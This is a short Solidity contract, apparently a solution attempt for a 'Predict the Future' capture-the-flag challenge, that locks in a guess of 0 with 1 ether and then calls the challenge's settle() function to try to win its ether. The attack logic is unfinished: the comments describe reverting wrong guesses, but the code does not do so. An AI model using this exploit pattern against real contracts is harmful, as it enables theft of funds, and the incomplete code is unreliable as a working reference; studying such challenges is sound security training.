pragma solidity ^0.7.3;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract FutureAttack {
    IPredictTheFutureChallenge victim;
    uint8 n;
    address payable owner;

    constructor(address victimAddress) public payable {
        victim = IPredictTheFutureChallenge(victimAddress);
        require(msg.value == 1 ether);
        owner = msg.sender;
    }

    function lockIn() public {
        n = 0;
        victim.lockInGuess{value: 1 ether}(n);
    }

    function attack() public {
        victim.settle();
    }

    receive() external payable {}
    // revert transaction if its wrong, or
    // fallback function that calls settle() to withdraw all ether
}
